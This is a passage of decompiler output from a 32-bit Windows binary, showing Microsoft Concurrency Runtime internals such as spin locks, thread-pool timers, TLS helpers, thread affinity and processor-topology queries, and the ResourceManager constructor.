    *(_DWORD *)(this + 24) = Block;
    sub_44A155(Block, (_DWORD *)this);
    *((_DWORD *)Block + 2) &= ~1u;
    sub_44A0FE(Block);
  }
  if ( a3 )
  {
    *(_DWORD *)(this + 8) = *((_DWORD *)Block + 2);
    *(_DWORD *)(this + 4) = *((_DWORD *)Block + 1);
    *(_DWORD *)this = *Block;
    *(_DWORD *)(this + 24) = Block;
  }
  return *((_DWORD *)Block + 4) != 2;
}

//----- (0044A2E9) --------------------------------------------------------
int __thiscall sub_44A2E9(int *this)
{
  int *v1; // ecx
  int result; // eax

  v1 = this + 1;
  if ( *v1 > 0 )
    return sub_44A3B1(v1, 0, -1);
  return result;
}

//----- (0044A2FF) --------------------------------------------------------
void __thiscall sub_44A2FF(_DWORD *this)
{
  if ( this[7] )
  {
    sub_44A3EE(this);
    sub_44A4C5(this);
  }
}

//----- (0044A317) --------------------------------------------------------
#error "44A317: call analysis failed (funcsize=8)"

//----- (0044A32E) --------------------------------------------------------
void __thiscall sub_44A32E(LPCRITICAL_SECTION lpCriticalSection)
{
  LeaveCriticalSection(lpCriticalSection);
}

//----- (0044A336) --------------------------------------------------------
void __thiscall sub_44A336(volatile signed __int32 *this)
{
  _InterlockedDecrement(this);
}

//----- (0044A33A) --------------------------------------------------------
void __thiscall sub_44A33A(volatile signed __int32 *this)
{
  *this = 0;
  _InterlockedDecrement(this + 1);
}

//----- (0044A345) --------------------------------------------------------
signed __int32 __thiscall sub_44A345(signed __int32 this, signed __int32 *a2)
{
  bool v3; // zf
  signed __int32 result; // eax

  *(_DWORD *)(this + 8) = a2[2];
  *(_DWORD *)(this + 4) = a2[1];
  v3 = *(_DWORD *)(this + 4) == 0;
  result = *a2;
  *(_DWORD *)this = *a2;
  if ( v3 )
  {
    result = _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), this, (signed __int32)a2);
    if ( (signed __int32 *)result != a2 )
    {
      sub_44A1BD(a2);
      *(_DWORD *)(this + 8) = a2[2];
      *(_DWORD *)(this + 4) = a2[1];
      result = *a2;
      *(_DWORD *)this = *a2;
    }
  }
  *(_DWORD *)(this + 24) = this;
  return result;
}

//----- (0044A394) --------------------------------------------------------
char __thiscall sub_44A394(volatile signed __int32 *this)
{
  if ( _InterlockedCompareExchange(this, -1, 0) )
    return 0;
  _InterlockedIncrement(this + 1);
  return 1;
}

//----- (0044A3AB) --------------------------------------------------------
DWORD sub_44A3AB()
{
  return dwSpinCount;
}

//----- (0044A3B1) --------------------------------------------------------
int __cdecl sub_44A3B1(_DWORD *a1, int a2, int a3)
{
  int v3; // esi
  int v4; // edx
  int v5; // ecx
  int result; // eax

  v3 = 10;
LABEL_6:
  v5 = 0;
  while ( 1 )
  {
    result = a3 & *a1;
    if ( result == a2 )
      return result;
    v4 = v3;
    _mm_pause();
    if ( ++v5 >= dwSpinCount )
    {
      if ( v3 > 0 )
        --v3;
      sub_44AA64(v4 <= 0);
      goto LABEL_6;
    }
  }
}

//----- (0044A3EE) --------------------------------------------------------
signed __int32 __thiscall sub_44A3EE(void *this)
{
  signed __int32 Parameter[6]; // [esp+4h] [ebp-18h] BYREF

  sub_449E48(Parameter, 0xFFFFFFFF);
  sub_44A24E((int)this, Parameter, 0);
  return sub_44A345((signed __int32)this, Parameter);
}
// 44A3EE: using guessed type signed __int32 Parameter[6];

//----- (0044A41C) --------------------------------------------------------
char __thiscall sub_44A41C(signed __int32 this)
{
  HANDLE Parameter[2]; // [esp+8h] [ebp-18h] BYREF
  int v4; // [esp+10h] [ebp-10h]

  sub_449E48(Parameter, 0xFFFFFFFF);
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(this + 28), (signed __int32)Parameter, 0) )
    return 0;
  *(_DWORD *)(this + 24) = Parameter;
  sub_44A155(Parameter, (_DWORD *)this);
  v4 &= ~1u;
  sub_44A345(this, (signed __int32 *)Parameter);
  return 1;
}
// 44A41C: using guessed type HANDLE Parameter[2];

//----- (0044A467) --------------------------------------------------------
char __thiscall sub_44A467(void *this, DWORD DueTime)
{
  HANDLE *v3; // eax
  char v4; // bl
  signed __int32 *v5; // esi

  v3 = (HANDLE *)operator new(0x18u);
  v4 = 0;
  if ( v3 )
    v5 = (signed __int32 *)sub_449E48(v3, DueTime);
  else
    v5 = 0;
  if ( sub_44A24E((int)this, v5, 0) )
  {
    sub_44A345((signed __int32)this, v5);
    v4 = 1;
  }
  sub_44A04A(v5);
  return v4;
}

//----- (0044A4C5) --------------------------------------------------------
void __thiscall sub_44A4C5(void *this)
{
  _DWORD *v2; // ecx
  int v3; // esi
  volatile signed __int32 *v4; // ebx

  v2 = (_DWORD *)*((_DWORD *)this + 6);
  *(_DWORD *)this = 0;
  v3 = v2[1];
  *((_DWORD *)this + 6) = v3;
  if ( v3
    || (_DWORD *)_InterlockedCompareExchange((volatile signed __int32 *)this + 7, 0, (signed __int32)v2) != v2
    && (v3 = sub_44A1BD(v2), (*((_DWORD *)this + 6) = v3) != 0) )
  {
    do
    {
      if ( sub_44A123((volatile signed __int32 *)v3) )
        break;
      v4 = (volatile signed __int32 *)v3;
      v3 = *(_DWORD *)(v3 + 4);
      *((_DWORD *)this + 6) = v3;
      if ( !v3
        && (volatile signed __int32 *)_InterlockedCompareExchange(
                                        (volatile signed __int32 *)this + 7,
                                        0,
                                        (signed __int32)v4) != v4 )
      {
        v3 = sub_44A1BD(v4);
        *((_DWORD *)this + 6) = v3;
      }
      sub_44A04A(v4);
    }
    while ( v3 );
  }
}

//----- (0044A57F) --------------------------------------------------------
void __thiscall sub_44A57F(char *this)
{
  int v2; // ecx

  v2 = *(_DWORD *)this;
  if ( v2 )
  {
    **(_DWORD **)(v2 + 256) = 0;
    sub_44AB34(v2, 1);
  }
  sub_449F62((LPCRITICAL_SECTION)(this + 4));
}

//----- (0044A5CE) --------------------------------------------------------
int sub_44A5CE()
{
  HMODULE ModuleHandleW; // esi
  BOOL (__stdcall *SetThreadGroupAffinity)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY); // ebx
  BOOL (__stdcall *GetThreadGroupAffinity)(HANDLE, PGROUP_AFFINITY); // eax
  BOOL (__stdcall *v3)(HANDLE, PGROUP_AFFINITY); // edi
  void (__stdcall *GetCurrentProcessorNumberEx)(PPROCESSOR_NUMBER); // eax
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+Ch] [ebp-10h] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  SetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, const GROUP_AFFINITY *, PGROUP_AFFINITY))GetProcAddress(
                                                                                                  ModuleHandleW,
                                                                                                  "SetThreadGroupAffinity");
  GetThreadGroupAffinity = (BOOL (__stdcall *)(HANDLE, PGROUP_AFFINITY))GetProcAddress(
                                                                          ModuleHandleW,
                                                                          "GetThreadGroupAffinity");
  v3 = GetThreadGroupAffinity;
  if ( !SetThreadGroupAffinity || !GetThreadGroupAffinity )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
LABEL_8:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_9:
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  dword_4FFFD8 = sub_44AB76((int)SetThreadGroupAffinity);
  dword_4FFFDC = sub_44AB76((int)v3);
  GetCurrentProcessorNumberEx = (void (__stdcall *)(PPROCESSOR_NUMBER))GetProcAddress(
                                                                         ModuleHandleW,
                                                                         "GetCurrentProcessorNumberEx");
  if ( !GetCurrentProcessorNumberEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_9;
    goto LABEL_8;
  }
  result = sub_44AB76((int)GetCurrentProcessorNumberEx);
  dword_4FFFD4 = result;
  return result;
}
// 4FFFD4: using guessed type int dword_4FFFD4;
// 4FFFD8: using guessed type int dword_4FFFD8;
// 4FFFDC: using guessed type int dword_4FFFDC;
// 44A5CE: using guessed type _DWORD pExceptionObject[4];

//----- (0044A677) --------------------------------------------------------
BOOL __cdecl sub_44A677(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period)
{
  return ChangeTimerQueueTimer(TimerQueue, Timer, DueTime, Period);
}

//----- (0044A68E) --------------------------------------------------------
BOOL __cdecl sub_44A68E(HANDLE hObject)
{
  return CloseHandle(hObject);
}

//----- (0044A69C) --------------------------------------------------------
int __cdecl sub_44A69C(unsigned __int8 a1)
{
  int result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = __crtCreateEventExW(0, 0, 2 * a1, 2031618);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 44A69C: using guessed type _DWORD pExceptionObject[4];

//----- (0044A707) --------------------------------------------------------
BOOL __cdecl sub_44A707(
        PHANDLE phNewTimer,
        HANDLE TimerQueue,
        WAITORTIMERCALLBACK Callback,
        PVOID Parameter,
        DWORD DueTime,
        DWORD Period,
        ULONG Flags)
{
  return CreateTimerQueueTimer(phNewTimer, TimerQueue, Callback, Parameter, DueTime, Period, Flags);
}

//----- (0044A727) --------------------------------------------------------
int __cdecl sub_44A727(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent)
{
  int i; // esi
  int result; // eax

  for ( i = 16; i > 0; --i )
  {
    result = DeleteTimerQueueTimer(TimerQueue, Timer, CompletionEvent);
    if ( result )
      break;
    result = GetLastError();
    if ( result == 997 )
      break;
  }
  return result;
}

//----- (0044A756) --------------------------------------------------------
int __cdecl sub_44A756(int a1)
{
  int (__thiscall *v1)(_DWORD, int); // esi

  v1 = (int (__thiscall *)(_DWORD, int))sub_44AB76(dword_4FFFD4);
  return v1(v1, a1);
}
// 4FFFD4: using guessed type int dword_4FFFD4;

//----- (0044A778) --------------------------------------------------------
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_44A778(PDWORD ReturnedLength)
{
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v1; // eax
  struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *v2; // edi
  int LastError; // eax
  int v5; // [esp+8h] [ebp-10h] BYREF
  _DWORD pExceptionObject[3]; // [esp+Ch] [ebp-Ch] BYREF

  GetLogicalProcessorInformation(0, ReturnedLength);
  if ( GetLastError() != 122 )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
    goto LABEL_9;
  }
  v1 = (struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *)malloc(*ReturnedLength);
  v2 = v1;
  if ( !v1 )
  {
    sub_42E414(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !GetLogicalProcessorInformation(v1, ReturnedLength) )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_10;
LABEL_9:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_10:
    sub_452A0F(&v5, LastError);
    _CxxThrowException(&v5, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v2;
}
// 44A778: using guessed type _DWORD pExceptionObject[3];

//----- (0044A7FF) --------------------------------------------------------
void *__cdecl sub_44A7FF(int a1, size_t *a2)
{
  HMODULE ModuleHandleW; // eax
  BOOL (__stdcall *GetLogicalProcessorInformationEx)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // eax
  BOOL (__stdcall *v4)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD); // esi
  int LastError; // eax
  void *v6; // eax
  void *v7; // edi
  int v9; // [esp+Ch] [ebp-10h] BYREF
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-Ch] BYREF

  ModuleHandleW = GetModuleHandleW(L"kernel32.dll");
  GetLogicalProcessorInformationEx = (BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD))GetProcAddress(ModuleHandleW, "GetLogicalProcessorInformationEx");
  v4 = GetLogicalProcessorInformationEx;
  if ( !GetLogicalProcessorInformationEx )
  {
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
    goto LABEL_10;
  }
  ((void (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, _DWORD, size_t *))GetLogicalProcessorInformationEx)(
    GetLogicalProcessorInformationEx,
    a1,
    0,
    a2);
  if ( GetLastError() != 122 )
    goto LABEL_3;
  v6 = malloc(*a2);
  v7 = v6;
  if ( !v6 )
  {
    sub_42E414(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !((int (__thiscall *)(BOOL (__stdcall *)(LOGICAL_PROCESSOR_RELATIONSHIP, PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX, PDWORD), int, void *, size_t *))v4)(
          v4,
          a1,
          v6,
          a2) )
  {
LABEL_3:
    LastError = GetLastError();
    if ( LastError <= 0 )
      goto LABEL_11;
LABEL_10:
    LastError = (unsigned __int16)LastError | 0x80070000;
LABEL_11:
    sub_452A0F(&v9, LastError);
    _CxxThrowException(&v9, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v7;
}
// 44A7FF: using guessed type _DWORD pExceptionObject[3];

//----- (0044A8B3) --------------------------------------------------------
ULONG sub_44A8B3()
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  ULONG HighestNodeNumber; // [esp+10h] [ebp-4h] BYREF

  if ( !GetNumaHighestNodeNumber(&HighestNodeNumber) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return HighestNodeNumber;
}
// 44A8B3: using guessed type _DWORD pExceptionObject[4];

//----- (0044A8F6) --------------------------------------------------------
int __cdecl sub_44A8F6(int a1, int a2)
{
  void (__thiscall *v2)(_DWORD, int, int); // esi
  HANDLE CurrentProcess; // eax
  ULONG_PTR SystemAffinityMask; // [esp+0h] [ebp-8h] BYREF
  ULONG_PTR ProcessAffinityMask; // [esp+4h] [ebp-4h] BYREF

  if ( sub_44CE8E() < 4 )
  {
    CurrentProcess = GetCurrentProcess();
    GetProcessAffinityMask(CurrentProcess, &ProcessAffinityMask, &SystemAffinityMask);
    *(_WORD *)(a2 + 4) = 0;
    *(_DWORD *)a2 = ProcessAffinityMask;
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, int, int))sub_44AB76(dword_4FFFDC);
    v2(v2, a1, a2);
  }
  return 1;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 4FFFDC: using guessed type int dword_4FFFDC;

//----- (0044A94F) --------------------------------------------------------
int __cdecl sub_44A94F(HANDLE hThread)
{
  return GetThreadPriority(hThread);
}

//----- (0044A962) --------------------------------------------------------
int __cdecl sub_44A962(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount)
{
  return __crtInitializeCriticalSectionEx(lpCriticalSection, dwSpinCount, 0);
}

//----- (0044A977) --------------------------------------------------------
HANDLE __cdecl sub_44A977(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context)
{
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-14h] BYREF
  HANDLE phNewWaitObject; // [esp+10h] [ebp-4h] BYREF

  if ( !RegisterWaitForSingleObject(&phNewWaitObject, hObject, Callback, Context, 0xFFFFFFFF, 0xCu) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return phNewWaitObject;
}
// 44A977: using guessed type _DWORD pExceptionObject[4];

//----- (0044A9C7) --------------------------------------------------------
int __cdecl sub_44A9C7(HANDLE hThread, DWORD_PTR *a2)
{
  void (__thiscall *v2)(_DWORD, HANDLE, DWORD_PTR *, _DWORD); // esi

  if ( sub_44CE8E() < 4 )
  {
    SetThreadAffinityMask(hThread, *a2);
  }
  else
  {
    v2 = (void (__thiscall *)(_DWORD, HANDLE, DWORD_PTR *, _DWORD))sub_44AB76(dword_4FFFD8);
    v2(v2, hThread, a2, 0);
  }
  return 1;
}
// 44CE8E: using guessed type int sub_44CE8E(void);
// 4FFFD8: using guessed type int dword_4FFFD8;

//----- (0044AA0B) --------------------------------------------------------
BOOL __cdecl sub_44AA0B(HANDLE hThread, int nPriority)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = SetThreadPriority(hThread, nPriority);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 44AA0B: using guessed type _DWORD pExceptionObject[4];

//----- (0044AA4D) --------------------------------------------------------
DWORD __cdecl sub_44AA4D(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable)
{
  return SignalObjectAndWait(hObjectToSignal, hObjectToWaitOn, dwMilliseconds, bAlertable);
}

//----- (0044AA64) --------------------------------------------------------
void __cdecl sub_44AA64(DWORD dwMilliseconds)
{
  Sleep(dwMilliseconds);
}

//----- (0044AA78) --------------------------------------------------------
DWORD sub_44AA78()
{
  DWORD result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsAlloc();
  if ( result == -1 )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 44AA78: using guessed type _DWORD pExceptionObject[4];

//----- (0044AAB5) --------------------------------------------------------
BOOL __cdecl sub_44AAB5(DWORD dwTlsIndex)
{
  return TlsFree(dwTlsIndex);
}

//----- (0044AAC3) --------------------------------------------------------
LPVOID __cdecl sub_44AAC3(DWORD dwTlsIndex)
{
  return TlsGetValue(dwTlsIndex);
}

//----- (0044AAD1) --------------------------------------------------------
BOOL __cdecl sub_44AAD1(DWORD dwTlsIndex, LPVOID lpTlsValue)
{
  BOOL result; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  result = TlsSetValue(dwTlsIndex, lpTlsValue);
  if ( !result )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_452A0F(pExceptionObject, LastError);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}
// 44AAD1: using guessed type _DWORD pExceptionObject[4];

//----- (0044AB13) --------------------------------------------------------
BOOL __cdecl sub_44AB13(HANDLE WaitHandle)
{
  return UnregisterWait(WaitHandle);
}

//----- (0044AB21) --------------------------------------------------------
DWORD __cdecl sub_44AB21(HANDLE hHandle, DWORD dwMilliseconds)
{
  return WaitForSingleObjectEx(hHandle, dwMilliseconds, 0);
}

//----- (0044AB34) --------------------------------------------------------
int __thiscall sub_44AB34(int this, char a2)
{
  int result; // eax

  if ( a2 )
    result = _InterlockedIncrement((volatile signed __int32 *)(this + 1288));
  else
    result = *(_DWORD *)(this + 1280) - *(_DWORD *)(this + 1284);
  if ( result == 1 )
    return SetEvent(*(HANDLE *)this);
  return result;
}

//----- (0044AB68) --------------------------------------------------------
int *sub_44AB68()
{
  int *result; // eax

  if ( hLibModule )
    return sub_44FD2F();
  return result;
}

//----- (0044AB76) --------------------------------------------------------
int __cdecl sub_44AB76(int a1)
{
  return a1 ^ dword_500054;
}
// 500054: using guessed type int dword_500054;

//----- (0044AB83) --------------------------------------------------------
HMODULE __cdecl sub_44AB83(int a1)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a1, 0, 0, 0);
  unknown_libname_47(a1, 1);
  unknown_libname_34(a1);
  sub_44FD2F();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)FreeLibrary(hLibModule);
  return result;
}
// 4346BE: using guessed type _DWORD __cdecl unknown_libname_34(_DWORD);
// 4349C0: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 434A82: using guessed type _DWORD __cdecl unknown_libname_47(_DWORD, _DWORD);

//----- (0044ABBF) --------------------------------------------------------
HMODULE __cdecl sub_44ABBF(DWORD dwExitCode)
{
  HMODULE result; // eax

  result = (HMODULE)_InterlockedExchangeAdd(&dword_4FFFE8, 0xFFFFFFFF);
  if ( !result )
  {
    sub_44FD2F();
    result = hLibModule;
    if ( hLibModule )
      FreeLibraryAndExitThread(hLibModule, dwExitCode);
  }
  return result;
}
// 4FFFE8: using guessed type int dword_4FFFE8;

//----- (0044ABE9) --------------------------------------------------------
uintptr_t sub_44ABE9()
{
  uintptr_t v0; // esi
  HANDLE CurrentThread; // eax
  struct _FILETIME CreationTime; // [esp+4h] [ebp-10h] BYREF
  struct _FILETIME ExitTime; // [esp+Ch] [ebp-8h] BYREF

  dword_500050 = 1;
  v0 = __security_cookie ^ (unsigned int)EncodePointer(&dword_500054);
  CurrentThread = GetCurrentThread();
  if ( GetThreadTimes(CurrentThread, &CreationTime, &ExitTime, &ExitTime, &ExitTime) )
    v0 ^= CreationTime.dwLowDateTime ^ CreationTime.dwHighDateTime;
  return v0;
}
// 500050: using guessed type int dword_500050;
// 500054: using guessed type int dword_500054;

//----- (0044AC35) --------------------------------------------------------
int __cdecl sub_44AC35(
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        SIZE_T dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        DWORD dwCreationFlags,
        LPDWORD lpThreadId)
{
  int Semaphore; // esi

  Semaphore = __crtCreateSemaphoreExW_0(
                lpThreadAttributes,
                dwStackSize,
                lpStartAddress,
                lpParameter,
                dwCreationFlags,
                lpThreadId);
  if ( Semaphore && _InterlockedIncrement(&dword_4FFFE8) == 1 )
  {
    sub_44AC7B();
    _InterlockedIncrement(&dword_4F807C);
  }
  return Semaphore;
}
// 4F807C: using guessed type int dword_4F807C;
// 4FFFE8: using guessed type int dword_4FFFE8;

//----- (0044AC7B) --------------------------------------------------------
HMODULE sub_44AC7B()
{
  HMODULE result; // eax
  DWORD ModuleFileNameW; // eax
  int LastError; // eax
  _DWORD pExceptionObject[4]; // [esp+4h] [ebp-21Ch] BYREF
  WCHAR Filename[260]; // [esp+14h] [ebp-20Ch] BYREF

  result = GetModuleHandleA(0);
  if ( result != (HMODULE)0x400000 )
  {
    ModuleFileNameW = GetModuleFileNameW((HMODULE)0x400000, Filename, 0x104u);
    if ( !ModuleFileNameW || ModuleFileNameW == 260 )
    {
      LastError = GetLastError();
      if ( LastError > 0 )
        LastError = (unsigned __int16)LastError | 0x80070000;
      sub_452A0F(pExceptionObject, LastError);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
    result = LoadLibraryExW(Filename, 0, 0);
    hLibModule = result;
  }
  return result;
}
// 44AC7B: using guessed type _DWORD pExceptionObject[4];

//----- (0044AD0F) --------------------------------------------------------
int __cdecl sub_44AD0F(unsigned int a1, int a2, int a3, char a4)
{
  int result; // eax
  int v5; // esi
  __int64 v6; // [esp+4h] [ebp-8h] BYREF

  result = unknown_libname_37(a2, a3, 0);
  v5 = result;
  if ( result )
  {
    sub_44AC7B();
    _InterlockedIncrement(&dword_4F807C);
    v6 = -10000i64 * a1;
    __crtSetThreadpoolTimer(v5, &v6, a4 != 0 ? a1 : 0, 0);
    return v5;
  }
  return result;
}
// 4347A9: using guessed type _DWORD __cdecl unknown_libname_37(_DWORD, _DWORD, _DWORD);
// 4349C0: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);
// 4F807C: using guessed type int dword_4F807C;

//----- (0044AD6E) --------------------------------------------------------
int __cdecl sub_44AD6E(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // esi

  result = unknown_libname_38(a2, a3, 0);
  v4 = result;
  if ( result )
  {
    sub_44AC7B();
    _InterlockedIncrement(&dword_4F807C);
    __crtSetThreadpoolWait(v4, a1, 0);
    return v4;
  }
  return result;
}
// 4347D1: using guessed type _DWORD __cdecl unknown_libname_38(_DWORD, _DWORD, _DWORD);
// 4349E7: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);
// 4F807C: using guessed type int dword_4F807C;

//----- (0044ADA7) --------------------------------------------------------
HMODULE __cdecl sub_44ADA7(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolTimer(a2, 0, 0, 0);
  unknown_libname_34(a2);
  sub_44FD2F();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_40(a1, hLibModule);
  return result;
}
// 4346BE: using guessed type _DWORD __cdecl unknown_libname_34(_DWORD);
// 434830: using guessed type _DWORD __cdecl unknown_libname_40(_DWORD, _DWORD);
// 4349C0: using guessed type _DWORD __cdecl __crtSetThreadpoolTimer(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0044ADDD) --------------------------------------------------------
HMODULE __cdecl sub_44ADDD(int a1, int a2)
{
  HMODULE result; // eax

  __crtSetThreadpoolWait(a2, 0, 0);
  unknown_libname_35(a2);
  sub_44FD2F();
  result = hLibModule;
  if ( hLibModule )
    return (HMODULE)unknown_libname_40(a1, hLibModule);
  return result;
}
// 4346DC: using guessed type _DWORD __cdecl unknown_libname_35(_DWORD);
// 434830: using guessed type _DWORD __cdecl unknown_libname_40(_DWORD, _DWORD);
// 4349E7: using guessed type _DWORD __cdecl __crtSetThreadpoolWait(_DWORD, _DWORD, _DWORD);

//----- (0044AE12) --------------------------------------------------------
__int32 __thiscall sub_44AE12(volatile __int32 *this)
{
  sub_4538D4();
  return sub_44AE22(this);
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (0044AE22) --------------------------------------------------------
__int32 __thiscall sub_44AE22(volatile __int32 *this)
{
  __int32 result; // eax
  char v3[8]; // [esp+4h] [ebp-10h] BYREF
  int v4; // [esp+Ch] [ebp-8h]
  void (*v5)(); // [esp+10h] [ebp-4h]

  result = _InterlockedExchange(this, 1);
  if ( result )
  {
    v4 = 0;
    v5 = sub_44AE5E;
    do
    {
      sub_449592((int)v3);
      result = _InterlockedExchange(this, 1);
    }
    while ( result );
  }
  return result;
}
// 44AE22: using guessed type char var_10[8];

//----- (0044AE53) --------------------------------------------------------
int __thiscall sub_44AE53(_DWORD *this)
{
  *this = 0;
  return sub_4538D4();
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (0044AE5E) --------------------------------------------------------
void sub_44AE5E()
{
  sub_44AA64(0);
}

//----- (0044AE67) --------------------------------------------------------
char __thiscall sub_44AE67(volatile __int32 *this)
{
  char v2; // bl

  sub_4538D4();
  v2 = sub_44AE87(this);
  if ( !v2 )
    sub_4538D4();
  return v2;
}
// 4538D4: using guessed type int sub_4538D4(void);

//----- (0044AE87) --------------------------------------------------------
char __thiscall sub_44AE87(volatile __int32 *this)
{
  char v1; // dl

  if ( *this )
    return 0;
  v1 = 1;
  if ( _InterlockedExchange(this, 1) )
    return 0;
  return v1;
}

//----- (0044AE9C) --------------------------------------------------------
int sub_44AE9C()
{
  LPVOID v0; // eax

  v0 = sub_452024();
  if ( v0 )
    return (*(int (__thiscall **)(LPVOID))(*(_DWORD *)v0 + 32))(v0);
  else
    return SwitchToThread();
}

//----- (0044AEC3) --------------------------------------------------------
int sub_44AEC3()
{
  int v0; // edi

  v0 = sub_44A028();
  return (*(int (__thiscall **)(int))(*(_DWORD *)v0 + 24))(v0);
}
// 44A028: using guessed type int sub_44A028(void);

//----- (0044AEE5) --------------------------------------------------------
_DWORD *__thiscall sub_44AEE5(_DWORD *this, int a2)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  sub_44A8F6(a2, (int)this);
  return this;
}

//----- (0044AF06) --------------------------------------------------------
int __thiscall sub_44AF06(int this)
{
  _BYTE *v2; // eax
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v5; // [esp+28h] [ebp-4h]

  pExceptionObject[3] = this;
  *(_DWORD *)this = &Concurrency::details::ResourceManager::`vftable';
  *(_DWORD *)(this + 4) = 0;
  *(_DWORD *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 16;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_DWORD *)(this + 40) = 0;
  sub_449ED8((LPCRITICAL_SECTION)(this + 44));
